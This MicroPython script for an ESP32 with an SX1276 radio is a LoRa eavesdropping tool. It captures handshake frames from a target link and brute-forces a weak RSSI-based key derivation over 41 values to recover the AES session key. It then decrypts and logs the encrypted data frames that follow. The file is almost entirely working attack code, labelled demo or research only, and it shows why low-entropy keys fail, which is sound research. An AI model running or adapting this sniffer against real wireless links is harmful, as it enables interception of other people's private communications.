# lora_sniffer_bfp.py — LoRa sniffer/eavesdropper that breaks the RSSI-KDF handshake
# MicroPython (ESP32 + SX1276). No key is needed; it brute-forces quantized RSSI (-40..0 dBm).
#
# Captures:
#   1) HELLO: "hello=1,nonce=<hex8>"
#   2) KEY REPLY: "ek=<hex32>,nonce=<hex8>"
# It then brute-forces q in [-40..0] to recover SESSION_KEY from ek using:
#   K = SHA256("RSSI-KDFv1|" + str(q) + "|" + nonce)[:16], then AES-ECB decrypt(ek).
# If TAG matches, the first 16 bytes are SESSION_KEY.
#
# After recovering a key, it decrypts subsequent data frames (only 'msg' field):
#   "iv=<hex>,msg=<hex>,counter=<int>,t=<int>,kind=data"
#
# *** DEMO/RESEARCH ONLY ***

from lora_min import SX1276
import time, ubinascii, uhashlib, ucryptolib

# --- RADIO CONFIG (must match target link) ---
FREQ_MHZ = 915.0
SPREADING_FACTOR = 7

# --- BRUTE-FORCE RANGE FOR QUANTIZED RSSI ---
Q_MIN = -40
Q_MAX = 0
TAG_BLOCK = b"HSK-OK-ICEWIN!!#"  # must match the target system

# --- Optional: log to CSV on device (comment out to disable) ---
LOG_PATH = "/sniff_rssi_kdf.csv"

# -------- Helpers --------
def parse_kvs(text):
    kv = {}
    for part in text.split(","):
        if "=" in part:
            k, v = part.split("=", 1)
            kv[k.strip()] = v.strip()
    return kv

def kdf_from_rssi_and_nonce(q, nonce_bytes):
    h = uhashlib.sha256(b"RSSI-KDFv1|" + str(q).encode() + b"|" + nonce_bytes)
    return h.digest()[:16]  # 16B AES key

def aes_ecb_decrypt(key16, ct_bytes):
    c = ucryptolib.aes(key16, 1)  # 1 == ECB
    return c.decrypt(ct_bytes)

def pkcs7_unpad(b):
    pad = b[-1]
    if pad < 1 or pad > 16 or b[-pad:] != bytes([pad]) * pad:
        raise ValueError("bad PKCS#7 padding")
    return b[:-pad]

def dec_msg_cbc(key16, iv_hex, ct_hex):
    iv = ubinascii.unhexlify(iv_hex)
    ct = ubinascii.unhexlify(ct_hex)
    c = ucryptolib.aes(key16, 2, iv)  # 2 == CBC
    pt_padded = c.decrypt(ct)
    return pkcs7_unpad(pt_padded).decode()

def append_csv(path, row):
    try:
        with open(path, "a") as f:
            f.write(row + "\n")
    except:
        pass

# -------- Sniffer state --------
# Track by nonce so we can handle re-handshakes cleanly.
handshakes = {}  # nonce_hex -> {"hello_seen": bool, "ek_hex": str or None, "sess": bytes or None}
active_nonce = None          # last nonce for which we recovered a key
active_session_key = None    # bytes(16)

def note_hello(nonce_hex):
    global handshakes, active_nonce, active_session_key
    if active_nonce != nonce_hex:
        # new handshake observed; don't clear immediately—keep current key until new one is recovered
        pass
    hs = handshakes.get(nonce_hex, {"hello_seen": False, "ek_hex": None, "sess": None})
    hs["hello_seen"] = True
    handshakes[nonce_hex] = hs

def note_ek(nonce_hex, ek_hex):
    global handshakes
    hs = handshakes.get(nonce_hex, {"hello_seen": False, "ek_hex": None, "sess": None})
    hs["ek_hex"] = ek_hex
    handshakes[nonce_hex] = hs

def try_recover_key(nonce_hex):
    """Brute-force q in [-40..0] to recover session key."""
    global handshakes, active_nonce, active_session_key
    hs = handshakes.get(nonce_hex)
    if not hs or not hs.get("ek_hex"):
        return False

    try:
        nonce = ubinascii.unhexlify(nonce_hex)
        ek = ubinascii.unhexlify(hs["ek_hex"])
    except Exception as e:
        print("  [!] bad hex in nonce/ek:", e)
        return False

    for q in range(Q_MIN, Q_MAX + 1):
        try:
            K = kdf_from_rssi_and_nonce(q, nonce)
            pt = aes_ecb_decrypt(K, ek)
            if len(pt) != 32:
                continue
            sess = pt[:16]
            tag  = pt[16:32]
            if tag == TAG_BLOCK:
                print("  [+] Session key recovered | q={} | nonce={}".format(q, nonce_hex))
                hs["sess"] = sess
                handshakes[nonce_hex] = hs
                active_nonce = nonce_hex
                active_session_key = sess
                return True
        except Exception:
            pass
    print("  [-] Failed to recover key for nonce", nonce_hex)
    return False

# -------- Main --------
def main():
    print("Sniffer (bruteforce RSSI-KDF) starting...")
    lora = SX1276(sck=18, mosi=23, miso=19, cs=5, rst=17)
    lora.set_frequency(int(FREQ_MHZ * 1_000_000))
    lora.set_spreading_factor(SPREADING_FACTOR)

    # CSV header
    append_csv(LOG_PATH, "ts_ms,rssi_dBm,snr_dB,type,nonce,details")

    while True:
        payload, rssi, snr = lora.recv(timeout_ms=0)  # wait forever
        ts = time.ticks_ms()

        if payload is None:
            # CRC error or similar; not much to log
            continue

        # Try UTF-8 text first (your frames are CSV text)
        try:
            text = payload.decode("utf-8")
        except UnicodeError:
            # Non-UTF8 payload: log and skip
            append_csv(LOG_PATH, "{},{},{},bin,,".format(ts, rssi, snr))
            print("RX bin | {} bytes | RSSI={} SNR={}".format(len(payload), rssi, snr))
            continue

        kv = parse_kvs(text)

        # --- Observe HELLO ---
        if kv.get("hello") == "1" and "nonce" in kv:
            nonce_hex = kv["nonce"]
            note_hello(nonce_hex)
            append_csv(LOG_PATH, "{},{},{},hello,{},'{}'".format(ts, rssi, snr, nonce_hex, text))
            print("HELLO | nonce={} | RSSI={} SNR={}".format(nonce_hex, rssi, snr))
            # We just note it; actual recovery happens when we see ek.
            continue

        # --- Observe KEY REPLY (ek) ---
        if "ek" in kv and "nonce" in kv:
            nonce_hex = kv["nonce"]
            ek_hex    = kv["ek"]
            note_ek(nonce_hex, ek_hex)
            append_csv(LOG_PATH, "{},{},{},ek,{},'{}'".format(ts, rssi, snr, nonce_hex, text))
            print("KEY-REPLY | nonce={} | RSSI={} SNR={}".format(nonce_hex, rssi, snr))

            # Try to recover immediately (works even if we didn't see HELLO)
            if try_recover_key(nonce_hex):
                print("  -> Active key set for nonce", nonce_hex)
            continue

        # --- Observe DATA FRAMES (only the message field is encrypted) ---
        if kv.get("kind") == "data" and "iv" in kv and "msg" in kv:
            iv_hex = kv["iv"]
            ct_hex = kv["msg"]
            ctr    = kv.get("counter", "?")
            tval   = kv.get("t", "?")

            # If we haven't recovered a key yet, we can only log metadata
            if active_session_key is None:
                append_csv(LOG_PATH, "{},{},{},data,{},'no-key'".format(ts, rssi, snr, active_nonce or ""))
                print("DATA | (no key) ctr={} t={} | iv={} msg={} | RSSI={} SNR={}".format(
                    ctr, tval, iv_hex, ct_hex, rssi, snr))
            else:
                try:
                    msg_clear = dec_msg_cbc(active_session_key, iv_hex, ct_hex)
                    append_csv(LOG_PATH, "{},{},{},data,{},'dec-ok'".format(ts, rssi, snr, active_nonce or ""))
                    print("DATA | msg='{}' | ctr={} t={} | RSSI={} SNR={}".format(
                        msg_clear, ctr, tval, rssi, snr))
                except Exception as e:
                    append_csv(LOG_PATH, "{},{},{},data,{},'dec-fail'".format(ts, rssi, snr, active_nonce or ""))
                    print("DATA | decrypt FAIL ({}) | ctr={} t={} | RSSI={} SNR={}".format(
                        e, ctr, tval, rssi, snr))
            continue

        # Anything else (unknown frame)
        append_csv(LOG_PATH, "{},{},{},other,,'{}'".format(ts, rssi, snr, text))
        print("OTHER |", text, "| RSSI={} SNR={}".format(rssi, snr))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopped.")

